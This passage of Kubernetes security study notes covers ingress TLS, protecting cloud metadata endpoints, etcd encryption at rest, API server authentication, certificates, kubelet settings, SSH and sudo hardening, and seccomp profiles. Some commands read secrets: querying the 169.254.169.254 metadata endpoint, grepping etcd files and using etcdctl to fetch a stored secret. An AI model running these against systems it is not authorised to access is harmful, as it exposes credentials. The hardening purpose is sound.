<h3 id="ingress-with-tls"><a class="header" href="#ingress-with-tls">Ingress with TLS</a></h3>
<ul>
<li>
<p>Kubernetes automatically creates a self-signed certificate for HTTPS. To view it, first determine the HTTPS port of the ingress controller service:</p>
<pre><code>kubeadmin@kube-controlplane:~$ k get svc -n ingress-nginx
NAME                                 TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                      AGE
ingress-nginx-controller             NodePort    10.103.169.156   &lt;none&gt;        80:31818/TCP,443:30506/TCP   38m
ingress-nginx-controller-admission   ClusterIP   10.103.26.228    &lt;none&gt;        443/TCP                      38m
kubeadmin@kube-controlplane:~$
</code></pre>
</li>
<li>
<p>The HTTPS port is 30506 in this case. To view the self-signed certificate, we can use curl:</p>
<pre><code> Œª notes $ curl https://13.68.211.113:30506/service1 -k -v
* (304) (OUT), TLS handshake, Finished (20):
} [52 bytes data]
* SSL connection using TLSv1.3 / AEAD-AES256-GCM-SHA384 / [blank] / UNDEF
* ALPN: server accepted h2
* Server certificate:
*  subject: O=Acme Co; CN=Kubernetes Ingress Controller Fake Certificate             &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
*  start date: Dec 20 14:23:08 2024 GMT
*  expire date: Dec 20 14:23:08 2025 GMT
*  issuer: O=Acme Co; CN=Kubernetes Ingress Controller Fake Certificate
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
* using HTTP/2
* [HTTP/2] [1] OPENED stream for https://13.68.211.113:30506/service1
* [HTTP/2] [1] [:method: GET]
* [HTTP/2] [1] [:scheme: https]
* [HTTP/2] [1] [:authority: 13.68.211.113:30506]
* [HTTP/2] [1] [:path: /service1]
* [HTTP/2] [1] [user-agent: Mozilla/5.0 Gecko]
* [HTTP/2] [1] [accept: */*]
&gt; GET /service1 HTTP/2
&gt; Host: 13.68.211.113:30506
&gt; User-Agent: Mozilla/5.0 Gecko
&gt; Accept: */*
</code></pre>
</li>
<li>
<p>To configure a ingress resource to use TLS (HTTPS), we first need to create a certificate:</p>
<pre><code># create a new 2048-bit RSA private key and associated cert
openssl req -nodes -new -x509 -keyout my.key -out my.crt -subj "/CN=mysite.com"
</code></pre>
</li>
<li>
<p>Next, create a secret for the tls cert:</p>
<pre><code>kubectl create secret tls mycert --cert=my.crt --key=my.key -n my-namespace
</code></pre>
</li>
<li>
<p>Create the ingress:</p>
<pre><code>apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: secure-ingress
  annotations:
    nginx.ingress.kubernetes.io/ssl-redirect: "true"
spec:
  tls:
    - hosts:
        - example.com
      secretName: mycert
  rules:
    - host: example.com
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: secure-service
                port:
                  number: 80
</code></pre>
</li>
</ul>
<h3 id="annotations"><a class="header" href="#annotations">Annotations</a></h3>
<ul>
<li>Extend the functionality of Ingress controllers.</li>
<li>Common examples (specific to nginx):
<ul>
<li>nginx.ingress.kubernetes.io/rewrite-target: Rewrite request paths.</li>
<li>nginx.ingress.kubernetes.io/ssl-redirect: Force SSL.</li>
<li>nginx.ingress.kubernetes.io/proxy-body-size: Limit request size.</li>
</ul>
</li>
</ul>
<h2 id="protecting-node-metadata-and-endpoints"><a class="header" href="#protecting-node-metadata-and-endpoints">Protecting Node Metadata and Endpoints</a></h2>
<h3 id="protecting-endpoints"><a class="header" href="#protecting-endpoints">Protecting Endpoints</a></h3>
<pre><code>- Kubernetes clusters expose information on various ports:

    | Port Range | Purpose  |
    | ---------- | -------  | 
    | 6443       | kube-api |
    | 2379 - 2380 | etcd    |
    | 10250       | kubelet api |
    | 10259       | kube-scheduler |
    | 10257       | kube-controller-manager |

- Many of these ports are configurable. For example, to change the port that kube-api listens on, just modify `--secure-port` in the kube-api manifest.
- Setup firewall rules to minimize the attack surface
</code></pre>
<h3 id="securing-node-metadata"><a class="header" href="#securing-node-metadata">Securing Node Metadata</a></h3>
<ul>
<li>
<p>A lot of information can be obtained from node metadata</p>
<ul>
<li>Node name</li>
<li>Node state</li>
<li>annotations</li>
<li>System Info</li>
<li>etc.</li>
</ul>
</li>
<li>
<p>Why secure node metadata?</p>
<ul>
<li>If node metadata is tampered with, pods may be assigned to the wrong nodes, which has security implications to considers</li>
<li>You can determine the version of kubelet and other kubernetes components from node metadata</li>
<li>If an attacker can modify node metadata, they could taint all the nodes, making all nodes unscheduleable</li>
</ul>
</li>
<li>
<p>Protection Strategies</p>
<ul>
<li>Use RBAC to control who has access to modify node metadata</li>
<li>Node isolation using labels and node selectors</li>
<li>Audit logs to determine who is accessing the cluster and respond accordingly</li>
<li>Update node operating systems regularly</li>
<li>Update cluster components regularly</li>
</ul>
</li>
<li>
<p>Cloud providers such as Amazon and Azure often expose node information via metadata endpoints on the node. These endpoints are important to protect.</p>
</li>
<li>
<p>This endpoint can be accessed at 169.254.169.254 on nodes in both Azure and AWS. An example for Azure:</p>
<pre><code>curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq
</code></pre>
</li>
<li>
<p>Node metadata endpoints can be prevented from being accessed by pods by creating network policies.</p>
<pre><code>apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress-metadata-server
  namespace: a12
spec:
  policyTypes:
  - Egress
  podSelector: {}
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32
</code></pre>
</li>
</ul>
<h2 id="verify-kubernetes-binaries"><a class="header" href="#verify-kubernetes-binaries">Verify Kubernetes Binaries</a></h2>
<ul>
<li>The SHA sum of a file changes if the content within the file is changed</li>
<li>You can download the binaries from github using wget.
Example: <code>wget -O /opt/kubernetes.tar.gz https://dl.k8s.io/v1.31.1/kubernetes.tar.gz</code></li>
<li>To validate that a binary downloaded from the internet has not been modified, check the hash code:
<pre><code>echo $(cat kubectl.sha256) kubectl | sha256sum --check
</code></pre>
</li>
</ul>
<h2 id="securing-etcd"><a class="header" href="#securing-etcd">Securing etcd</a></h2>
<ul>
<li>etcd is a distributed key-value store that Kubernetes uses to store configuration data</li>
<li>etcd by default listens on port 2379/tcp</li>
</ul>
<h3 id="play-with-etcd"><a class="header" href="#play-with-etcd">Play with etcd</a></h3>
<h4 id="step-1-create-the-base-binaries-directory"><a class="header" href="#step-1-create-the-base-binaries-directory">Step 1: Create the Base Binaries Directory</a></h4>
<pre><code>```sh
    mkdir /root/binaries
    cd /root/binaries
```
</code></pre>
<h4 id="step-2-download-and-copy-the-etcd-binaries-to-path"><a class="header" href="#step-2-download-and-copy-the-etcd-binaries-to-path">Step 2: Download and Copy the ETCD Binaries to Path</a></h4>
<pre><code>```sh
    wget https://github.com/etcd-io/etcd/releases/download/v3.5.18/etcd-v3.5.18-linux-amd64.tar.gz

    tar -xzvf etcd-v3.5.18-linux-amd64.tar.gz

    cd /root/binaries/etcd-v3.5.18-linux-amd64/

    cp etcd etcdctl /usr/local/bin/
```
</code></pre>
<h4 id="step-3-start-etcd"><a class="header" href="#step-3-start-etcd">Step 3: Start etcd</a></h4>
<pre><code>```sh
    cd /tmp
    etcd
```
</code></pre>
<h4 id="step-4-verification---store-and-fetch-data-from-etcd"><a class="header" href="#step-4-verification---store-and-fetch-data-from-etcd">Step 4: Verification - Store and Fetch Data from etcd</a></h4>
<pre><code>```sh
    etcdctl put key1 "value1"
```

```sh
    etcdctl get key1
```
</code></pre>
<h3 id="encrypting-data-in-transit-in-etcd"><a class="header" href="#encrypting-data-in-transit-in-etcd">Encrypting data in transit in etcd</a></h3>
<ul>
<li>etcd supports TLS encryption for data in transit</li>
<li>By default, etcd packaged with kubeadm is configured to use TLS encryption</li>
<li>One can capture packets from etcd using tcpdump:
<pre><code>      root@controlplane00:/var/lib/etcd/member# tcpdump -i lo -X port 2379

      tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
      listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
      16:10:01.691453 IP localhost.2379 &gt; localhost.42040: Flags [P.], seq 235868994:235869033, ack 3277609642, win 640, options [nop,nop,TS val 1280288044 ecr 1280288042], length 39
              0x0000:  4500 005b 35e4 4000 4006 06b7 7f00 0001  E..[5.@.@.......
              0x0010:  7f00 0001 094b a438 0e0f 1342 c35c 5aaa  .....K.8...B.\Z.
              0x0020:  8018 0280 fe4f 0000 0101 080a 4c4f a52c  .....O......LO.,
              0x0030:  4c4f a52a 1703 0300 2289 00d8 5dcc 7b88  LO.*...."...].{.
              0x0040:  6f7a 290f 536b 0fd0 f7d9 1fb4 f83f 4aab  oz).Sk.......?J.
              0x0050:  a6e7 0af8 0835 e597 a93d 4d              .....5...=M
      16:10:01.691479 IP localhost.42040 &gt; localhost.2379: Flags [.], ack 39, win 14819, options [nop,nop,TS val 1280288044 ecr 1280288044], length 0
              0x0000:  4500 0034 7174 4000 4006 cb4d 7f00 0001  E..4qt@.@..M....
              0x0010:  7f00 0001 a438 094b c35c 5aaa 0e0f 1369  .....8.K.\Z....i
              0x0020:  8010 39e3 fe28 0000 0101 080a 4c4f a52c  ..9..(......LO.,
              0x0030:  4c4f a52c                                LO.,
      16:10:01.691611 IP localhost.2379 &gt; localhost.42040: Flags [P.], seq 39:1222, ack 1, win 640, options [nop,nop,TS val 1280288044 ecr 1280288044], length 1183
              0x0000:  4500 04d3 35e5 4000 4006 023e 7f00 0001  E...5.@.@..&gt;....
              0x0010:  7f00 0001 094b a438 0e0f 1369 c35c 5aaa  .....K.8...i.\Z.
              0x0020:  8018 0280 02c8 0000 0101 080a 4c4f a52c  ............LO.,
              0x0030:  4c4f a52c 1703 0304 9ac0 c579 d4ed 808c  LO.,.......y....

              ..... redacted
</code></pre>
</li>
<li>The traffic captured in the output above is encrypted.</li>
</ul>
<h3 id="encrypting-data-at-rest-in-etcd"><a class="header" href="#encrypting-data-at-rest-in-etcd">Encrypting data at rest in etcd</a></h3>
<ul>
<li>
<p>By default, the API server stores plain-text representations of resources into etcd, with no at-rest encryption.</p>
</li>
<li>
<p>etcd stores data in the <code>/var/lib/etcd/member</code> directory. When the database is not encrypted, one can easily grep the contents of this directory, looking for secrets:</p>
<pre><code>root@controlplane00:/var/lib/etcd/member# ls -lisa
total 16
639000 4 drwx------ 4 root root 4096 Mar 21 10:53 .
385187 4 drwx------ 3 root root 4096 Mar 21 10:52 ..
639002 4 drwx------ 2 root root 4096 Mar 21 14:43 snap
638820 4 drwx------ 2 root root 4096 Mar 21 11:59 wal

root@controlplane00:/var/lib/etcd/member# grep -R test-secret .
grep: ./wal/00000000000000ac-0000000000a9340b.wal: binary file matches
grep: ./wal/00000000000000a8-0000000000a721c1.wal: binary file matches
grep: ./wal/00000000000000aa-0000000000a83f1e.wal: binary file matches
grep: ./wal/00000000000000a9-0000000000a7b97e.wal: binary file matches
grep: ./wal/00000000000000ab-0000000000a8d8a7.wal: binary file matches
grep: ./snap/db: binary file matches
</code></pre>
</li>
<li>
<p>The kube-apiserver process accepts an argument ‚Äìencryption-provider-config that specifies a path to a configuration file. The contents of that file, if you specify one, control how Kubernetes API data is encrypted in etcd.</p>
</li>
<li>
<p>If you are running the kube-apiserver without the ‚Äìencryption-provider-config command line argument, you do not have encryption at rest enabled. If you are running the kube-apiserver with the ‚Äìencryption-provider-config command line argument, and the file that it references specifies the <code>identity</code> provider as the first encryption provider in the list, then you do not have at-rest encryption enabled (the default identity provider does not provide any confidentiality protection.)</p>
</li>
<li>
<p>If you are running the kube-apiserver with the ‚Äìencryption-provider-config command line argument, and the file that it references specifies a provider other than <code>identity</code> as the first encryption provider in the list, then you already have at-rest encryption enabled. However, that check does not tell you whether a previous migration to encrypted storage has succeeded.</p>
</li>
<li>
<p>Example EncryptionConfiguration:</p>
<pre><code>  apiVersion: apiserver.config.k8s.io/v1
  kind: EncryptionConfiguration
  resources:
    - resources:
        - secrets
        - configmaps
        - pandas.awesome.bears.example # a custom resource API
      providers:
        # This configuration does not provide data confidentiality. The first
        # configured provider is specifying the "identity" mechanism, which
        # stores resources as plain text.
        #
        - identity: {} # plain text, in other words NO encryption
        - aesgcm:
            keys:
              - name: key1
                secret: c2VjcmV0IGlzIHNlY3VyZQ==
              - name: key2
                secret: dGhpcyBpcyBwYXNzd29yZA==
        - aescbc:
            keys:
              - name: key1
                secret: c2VjcmV0IGlzIHNlY3VyZQ==
              - name: key2
                secret: dGhpcyBpcyBwYXNzd29yZA==
        - secretbox:
            keys:
              - name: key1
                secret: YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY=
    - resources:
        - events
      providers:
        - identity: {} # do not encrypt Events even though *.* is specified below
    - resources:
        - '*.apps' # wildcard match requires Kubernetes 1.27 or later
      providers:
        - aescbc:
            keys:
            - name: key2
              secret: c2VjcmV0IGlzIHNlY3VyZSwgb3IgaXMgaXQ/Cg==
    - resources:
        - '*.*' # wildcard match requires Kubernetes 1.27 or later
      providers:
        - aescbc:
            keys:
            - name: key3
              secret: c2VjcmV0IGlzIHNlY3VyZSwgSSB0aGluaw==
</code></pre>
</li>
<li>
<p>Each resources array item is a separate config and contains a complete configuration. The resources.resources field is an array of Kubernetes resource names (resource or resource.group) that should be encrypted like Secrets, ConfigMaps, or other resources.</p>
</li>
<li>
<p>https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/</p>
</li>
<li>
<p>After enabling encryption in etcd, any resources that you created prior to enabling encryption will not be encrypted. For example, you can encrypt secrets by running:</p>
</li>
</ul>
<pre><code>kubectl get secrets -A -o yaml | kubectl replace -f -
</code></pre>
<ul>
<li>Example of getting a secret in etcd:</li>
</ul>
<pre><code>root@controlplane00:/etc/kubernetes/pki# ETCDCTL_API=3 etcdctl --cacert=./etcd/ca.crt --cert=./apiserver-etcd-client.crt --key=./apiserver-etcd-client.key get /registry/secrets/default/mysecret

/registry/secrets/default/mysecret
k8s:enc:aescbc:v1:key1:‹®t&gt;;8‹ë%TUIodEs*lsHGwjeF8S!Aqaj\PqÕæ9»∫7dJe{B2=|p4#'BuCxUY,*IuFM
                                                                                   wxx@
2Q0e5UzH^^)rX_H%GU…à-XqC.ÀΩpC `kBW&gt;K12 n

</code></pre>
<p>The path to the resource in the etcd database is ‚Äò/registry/<resource type="">/<namespace>/<resource name="">‚Äô</resource></namespace></resource></p>
<h2 id="securing-kube-apiserver"><a class="header" href="#securing-kube-apiserver">Securing kube-apiserver</a></h2>
<ul>
<li>Kube-apiserver acts as the gateway for all resources in kubernetes. Kube-apiserver is the only component in kubernetes that communicates with etcd</li>
<li>kube-apiserver authenticates to etcd using TLS client certificates.</li>
<li>Kube-apiserver should encrypt data before it is stored in etcd</li>
<li>kube-apiserver should only listen on an HTTPS endpoint. There was an option to host kube-apiserver on an HTTP endpoint, but this option has been deprecated as of 1.10 and removed in 1.22</li>
<li>kube-apiserver should have auditing enabled</li>
</ul>
<h3 id="authentication-2"><a class="header" href="#authentication-2">Authentication</a></h3>
<ul>
<li>One can authentication to the KubeAPI server using certificates or a kubeconfig file</li>
</ul>
<h3 id="access-controls"><a class="header" href="#access-controls">Access Controls</a></h3>
<ul>
<li>After a request is authenticated, it is authorized. Authorization is the process of determining what actions a user can perform.</li>
<li>Multiple authorization modules are supported:
<ul>
<li>AlwaysAllow - Allows all requests</li>
<li>AlwaysDeny - Blocks all requests</li>
<li>RBAC - Role-based access control for requests. This is the default authorization module in kubernetes</li>
<li>Node - Authorizes kubelets to access the kube-api server</li>
</ul>
</li>
</ul>
<h1 id="2-cluster-hardening"><a class="header" href="#2-cluster-hardening">2 Cluster Hardening</a></h1>
<h2 id="securing-access-to-the-kubeapi-server"><a class="header" href="#securing-access-to-the-kubeapi-server">Securing Access to the KubeAPI Server</a></h2>
<ul>
<li>A request to the KubeAPI server goes through 4 stages before it is processed by KubeAPI:
<ul>
<li>Authentication
<ul>
<li>Validates the identity of the caller by inspecting client certificates or tokens</li>
</ul>
</li>
<li>Authorization
<ul>
<li>The authorization stage verifies that the identity found in the first stage can access the verb and resource in the request</li>
</ul>
</li>
<li>Admission Controllers
<ul>
<li>Admission Control verifies that the requst is well-formed and/or potentially needs to be modified before proceeding</li>
</ul>
</li>
<li>Validation
<ul>
<li>This stage ensures that the request is valid.</li>
</ul>
</li>
</ul>
</li>
<li>You can determine the endpoint for the kubeapi server by running: <code>kubectl cluster-info</code></li>
<li>KubeAPI is also exposed via a service named ‚Äòkubernetes‚Äô in the default namespace
<pre><code>kubeadmin@kube-controlplane:~$ k get svc kubernetes -n default -o yaml
  apiVersion: v1
  kind: Service
  metadata:
    creationTimestamp: "2024-11-11T10:57:42Z"
    labels:
      component: apiserver
      provider: kubernetes
    name: kubernetes
    namespace: default
    resourceVersion: "234"
    uid: 768d1a22-91ff-4ab3-8cd7-b86340fc319a
  spec:
    clusterIP: 10.96.0.1
    clusterIPs:
    - 10.96.0.1
    internalTrafficPolicy: Cluster
    ipFamilies:
    - IPv4
    ipFamilyPolicy: SingleStack
    ports:
    - name: https
      port: 443
      protocol: TCP
      targetPort: 6443
    sessionAffinity: None
    type: ClusterIP
  status:
    loadBalancer: {}
</code></pre>
<ul>
<li>The endpoint of the kube-api server is also exposed to pods via environment variables:</li>
</ul>
<pre><code>kubeadmin@kube-controlplane:~$ k exec -it other -- /bin/sh -c 'env | grep -i kube'
 KUBERNETES_SERVICE_PORT=443
 KUBERNETES_PORT=tcp://10.96.0.1:443
 KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
 KUBERNETES_PORT_443_TCP_PORT=443
 KUBERNETES_PORT_443_TCP_PROTO=tcp
 KUBERNETES_SERVICE_PORT_HTTPS=443
 KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
 KUBERNETES_SERVICE_HOST=10.96.0.1
    ``` 

</code></pre>
</li>
</ul>
<h2 id="authentication-1-1"><a class="header" href="#authentication-1-1">Authentication</a></h2>
<ul>
<li>There are two types of accounts that would need access to a cluster: Humans and Machines. There is no such thing as a ‚Äòuser account‚Äô primitive in Kubernetes.</li>
</ul>
<h3 id="user-accounts"><a class="header" href="#user-accounts">User accounts</a></h3>
<ul>
<li>Developers, cluster admins, etc.</li>
</ul>
<h3 id="service-accounts"><a class="header" href="#service-accounts">Service Accounts</a></h3>
<ul>
<li>Service Accounts are created and managed by the Kubernetes API and can be used for machine authentication</li>
<li>To create a service account: <code>kubectl create serviceaccount &lt;account name&gt;</code></li>
<li>Service accounts are namespaced</li>
<li>When a service account is created, it has a token created automatically. The token is stored as a secret object.</li>
<li>You can also use the base64 encoded token to communicate with the Kube API Server:
<code>curl https://172.16.0.1:6443/api -insecure --header "Authorization: Bearer &lt;token value&gt;"</code></li>
<li>You can grant service accounts permission to the cluster itself by binding it to a role with a rolebinding. If a pod needs access to the cluster where it is hosted, you you configure the automountServiceAccountToken boolean parameter on the pod and assign it a service account that has the appropriate permissions to the cluster. The token will be mounted to the pods file system, where the value can then be accessed by the pod. The secret is mounted at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>.</li>
<li>A service account named ‚Äòdefault‚Äô is automatically created in every namespace</li>
<li>As of kubernetes 1.22, tokens are automatically mounted to pods by an admission controller as a projected volume.
<ul>
<li>https://github.com/kubernetes/enhancements/blob/master/keps/sig-auth/1205-bound-service-account-tokens/README.md</li>
</ul>
</li>
<li>As of Kubernetes 1.24, when you create a service account, a secret is no longer created automatically for the token. Now you must run <code>kubectl create token &lt;service account name&gt;</code> to create the token.
<ul>
<li>https://github.com/kubernetes/enhancements/issues/2799</li>
</ul>
</li>
<li>One can also manually create a token for a service account:</li>
</ul>
<pre><code>kubectl create token &lt;service-account-name&gt; --duration=100h
</code></pre>
<h2 id="tls-certificates"><a class="header" href="#tls-certificates">TLS Certificates</a></h2>
<ul>
<li>Server certificates are used to communicate with clients</li>
<li>Client certificates are used to communicate with servers</li>
<li>Server components used in Kubernetes and their certificates:
<ul>
<li>kube-api server: apiserver.crt, apiserver.key</li>
<li>etcd-server: etcdserver.crt, etcdserver.key</li>
<li>kubelet: kubelet.crt, kubelet.key</li>
</ul>
</li>
<li>Client components used in kubernetes and their certificates:
<ul>
<li>user certificates</li>
<li>kube-scheduler: scheduler.crt, scheduler.key</li>
<li>kube-controller-manager: controller-manager.crt, controller-manager.key</li>
<li>kube-proxy: kubeproxy.crt, kubeproxy.key</li>
</ul>
</li>
<li>To generate a self-signed certificate:
<code>openssl req -nodes -x509 -keyout my.key -out my.crt --subj="/CN=mysite.com"</code></li>
<li>To generate certificates, you can use openssl:
<ul>
<li>Create a new private key:
<code>openssl genrsa -out my.key 2048</code></li>
<li>Create a new certificate signing request:
<code>openssl req -new -key my.key -out my.csr -subj "/CN=ryan"</code></li>
<li>Sign the csr and generate the certificate or create a signing request with kube-api:
<ul>
<li>Sign and generate:
<code>openssl x509 -req -in my.csr -out my.crt</code></li>
<li>Create a <code>CertificateSigningRequest</code> with kube-api:
<pre><code># extract the base64 encoded values of the CSR:
cat my.csr | base64 | tr -d '\n'

# create a CertificateSigningRequest object with kube-api, provide the base64 encoded value
.... see the docs
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
<li>kubeadm will automatically generate certificates for clusters that it creates
<ul>
<li>kubeadm generates certificates in the <code>/etc/kubernetes/pki/</code> directory</li>
</ul>
</li>
<li>To view the details of a certificate, use openssl:
<code>openssl x509 -in &lt;path to crt&gt; -text -noout</code></li>
<li>Once you have a private key, you can sign it using the <a href="https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/#create-certificatessigningrequest">CertificateSigningRequest</a> object. The controller manager is responsible for signing these requests. You can then use the signed certificate values to authenticate to the Kube API server by placing the signed key, certificate, and ca in a kube config file (~/.kube/config)</li>
</ul>
<h2 id="kubelet-security"><a class="header" href="#kubelet-security">kubelet Security</a></h2>
<ul>
<li>By default, requests to the kubelet API are not authenticated. These requests are bound to an ‚Äòunauthenticated users‚Äô group. This behavior can be changed by setting the <code>--anonymous-auth</code> flag to <code>false</code> in the kubelet config</li>
<li>kubelet ports
<ul>
<li>port 10250 on the machine running a kubelet process serves an API that allows full access</li>
<li>port 10255 on the machine running a kubelet process serves an unauthenticated, read-only API</li>
</ul>
</li>
<li>kubelet supports 2 authentication mechanisms: bearer token and certificated-based authentication</li>
<li>You can find the location of the kubelet config file by looking at the process: <code>ps aux |grep -i kubelet</code></li>
</ul>
<h2 id="authorization"><a class="header" href="#authorization">Authorization</a></h2>
<h3 id="roles-and-clusterroles"><a class="header" href="#roles-and-clusterroles">Roles and ClusterRoles</a></h3>
<ul>
<li>Roles and clusteroles define what a user or service account can do within a cluster</li>
<li>The kubernetes primitive <code>role</code> is namespaced, <code>clusterrole</code> is not</li>
</ul>
<h3 id="role-bindings-and-cluster-role-bindings"><a class="header" href="#role-bindings-and-cluster-role-bindings">Role Bindings and Cluster Role Bindings</a></h3>
<ul>
<li><code>rolebinding</code> and <code>clusterrolebinding</code> link a user or service account to a role</li>
</ul>
<h1 id="3-system-hardening"><a class="header" href="#3-system-hardening">3 System Hardening</a></h1>
<h2 id="principle-of-least-privilege"><a class="header" href="#principle-of-least-privilege">Principle of Least Privilege</a></h2>
<ul>
<li>Ensure that people or bots only have access to what is needed, and nothing else.</li>
</ul>
<h2 id="limit-access-to-nodes"><a class="header" href="#limit-access-to-nodes">Limit access to nodes</a></h2>
<h3 id="managing-local-users-and-groups"><a class="header" href="#managing-local-users-and-groups">Managing Local Users and Groups</a></h3>
<ul>
<li>Commands to be aware of:
<code>id</code>
<code>who</code>
<code>last</code>
<code>groups</code>
<code>useradd</code>
<code>userdel</code>
<code>usermod</code>
<code>groupdel</code></li>
<li>Files to be aware of:
<code>/etc/passwd</code>
<code>/etc/shadow</code>
<code>/etc/group</code></li>
<li>Disable logins for users and set their login shell to <code>/bin/nologin</code></li>
<li>Remove users from groups they do not need to belong to</li>
</ul>
<h3 id="securing-ssh"><a class="header" href="#securing-ssh">Securing SSH</a></h3>
<ul>
<li>Set the following in <code>sshd_config</code></li>
</ul>
<pre><code>PermitRootLogin no
PasswordAuthentication no
</code></pre>
<h3 id="using-sudo"><a class="header" href="#using-sudo">Using sudo</a></h3>
<ul>
<li>The <code>/etc/sudoers</code> file controls and configures the behavior of the <code>sudo</code> command. Each entry follows a structured syntax. Below is a breakdown of the fields and their meanings:</li>
</ul>
<pre><code># Example Lines
# ----------------------------------
# User/Group       Host=Command(s)
admin             ALL=(ALL) NOPASSWD: ALL
%developers       ALL=(ALL) ALL
john              ALL=(ALL:ALL) /usr/bin/apt-get

# Field Breakdown

admin             ALL=(ALL) NOPASSWD: ALL
|                 |   |       |         |
|                 |   |       |         +---&gt; Command(s): Commands the user/group can execute.
|                 |   |       +------------&gt; Options: Modifiers like `NOPASSWD` (no password required).
|                 |   +--------------------&gt; Runas: User/Group the command can be run as.
|                 +------------------------&gt; Host: On which machine this rule applies (`ALL` for any).
+-----------------------------------------&gt; User/Group: The user or group this rule applies to.

# Examples Explained

1. Allow `admin` to execute any command without a password:
   admin ALL=(ALL) NOPASSWD: ALL
</code></pre>
<h3 id="remove-packages-packages"><a class="header" href="#remove-packages-packages">Remove Packages Packages</a></h3>
<ul>
<li>This one is self-explanatory. Don‚Äôt have unnecessary software installed on your nodes.</li>
</ul>
<h3 id="restrict-kernel-modules"><a class="header" href="#restrict-kernel-modules">Restrict Kernel Modules</a></h3>
<ul>
<li>Kernel modules are ways of extending the kernel to enable it to understand new hardware. They are like device drivers.</li>
<li><code>modprobe</code> allows you to load a kernel module</li>
<li><code>lsmod</code> allows you to view all loaded modules</li>
<li>You can blacklist modules by adding a new entry to <code>/etc/modprobe.d/blacklist.conf</code>
<ul>
<li>The entry should be in the format <code>blacklist &lt;module name&gt;</code></li>
<li>Example: <code>echo "blacklist sctp" &gt;&gt; /etc/modprobe.d/blacklist.conf</code></li>
</ul>
</li>
<li>You may need to reboot the system after disabling kernel modules or blacklisting them</li>
</ul>
<h3 id="disable-open-ports"><a class="header" href="#disable-open-ports">Disable Open Ports</a></h3>
<ul>
<li>Use <code>netstat -tunlp</code> or to list listening ports on a system</li>
<li>Stop the service associated with the open port or disable access with a firewall
<ul>
<li>Common firewalls you can use are <code>iptables</code> or <code>ufw</code>
<ul>
<li>Run <code>ufw status</code> to list the current status of the UFW firewall</li>
<li>Allow all traffic outbound: <code>ufw default allow outgoing</code></li>
<li>Deny all incoming: <code>ufw default deny incoming</code></li>
<li>Allow SSH from 172.16.154.24: <code>ufw allow from 172.16.154.24 to any port 22 proto tcp</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="tracing-syscalls"><a class="header" href="#tracing-syscalls">Tracing Syscalls</a></h2>
<ul>
<li>There are several ways to trace syscalls in Linux.</li>
</ul>
<h3 id="strace"><a class="header" href="#strace">strace</a></h3>
<ul>
<li><code>strace</code> is included with most Linux distributions.</li>
<li>To use <code>strace</code>, simply add it before the binary that you are running:
<pre><code>strace touch /tmp/test
</code></pre>
</li>
<li>You can also attach <code>strace</code> to a running process like this:
<pre><code>strace -p &lt;PID&gt;
</code></pre>
</li>
</ul>
<h3 id="aquasec-tracee"><a class="header" href="#aquasec-tracee">AquaSec Tracee</a></h3>
<ul>
<li><code>tracee</code> is an open source tool created by AquaSec</li>
<li>Uses eBPF (extended Berkely Packet Filter) to trace syscalls on a system. eBPF runs programs directly within the kernel space without loading any kernel modules. As a result, tools that use eBPF are more efficient and typically use less resources.</li>
<li><code>tracee</code> can be run by using the binaries or as a container</li>
</ul>
<h3 id="restricting-access-to-syscalls-with-seccomp"><a class="header" href="#restricting-access-to-syscalls-with-seccomp">Restricting Access to syscalls with seccomp</a></h3>
<ul>
<li>
<p><code>seccomp</code> can be used to restrict a process‚Äô access to syscalls. It allows access to the most commonly used syscalls, while restricting access to syscalls that can be considered dangerous.</p>
</li>
<li>
<p>To see if <code>seccomp</code> is enabled:</p>
<pre><code>grep -i seccomp /boot/config-$(uname -r)
</code></pre>
</li>
<li>
<p><code>seccomp</code> can operate in 1 of 3 modes:</p>
<ul>
<li><code>mode 0</code>: disabled</li>
<li><code>mode 1</code>: strict (blocks nearly all syscalls, except for 4)</li>
<li><code>mode 2</code>: selectively filters syscalls</li>
<li>To see which mode the process is currently running in:
<code>grep -i seccomp /proc/1/status</code> where ‚Äò1‚Äô is the PID of the process</li>
</ul>
</li>
<li>
<p><code>seccomp</code> profiles</p>
<ul>
<li>Kubernetes provides a default <code>seccomp</code> profile, that can be either restrictive or permissive, depending on your configuration</li>
<li>You can create custom profiles to fine-tune <code>seccomp</code> and which syscalls it blocks or allows within a containers</li>
<li>Example <code>seccomp</code> profile for <code>mode 1</code>:
<pre><code>{
  "defaultAction": "SCMP_ACT_ERRNO",
  "archMap": [
    { "architecture": "SCMP_ARCH_X86_64", "subArchitectures": [] }
  ],
  "syscalls": [
    {
      "names": ["read", "write", "exit", "sigreturn"],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
</code></pre>
</li>
</ul>
</li>
<li>
<p>To apply a <code>seccomp</code> profile to a pod:</p>
<pre><code>apiVersion: v1
kind: Pod
metadata:
  name: audit-pod
  labels:
    app: audit-pod
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/audit.json #this path is relative to default seccomp profile location (/var/lib/kubelet/seccomp)
  containers:
  - name: test-container
    image: hashicorp/http-echo:1.0
    args:
    - "-text=just made some syscalls!"
    securityContext:
      allowPrivilegeEscalation: false
</code></pre>
</li>
</ul>
<h2 id="restrict-access-to-file-systems"><a class="header" href="#restrict-access-to-file-systems">Restrict access to file systems</a></h2>
<h3 id="apparmor"><a class="header" href="#apparmor">AppArmor</a></h3>
<ul>
<li>
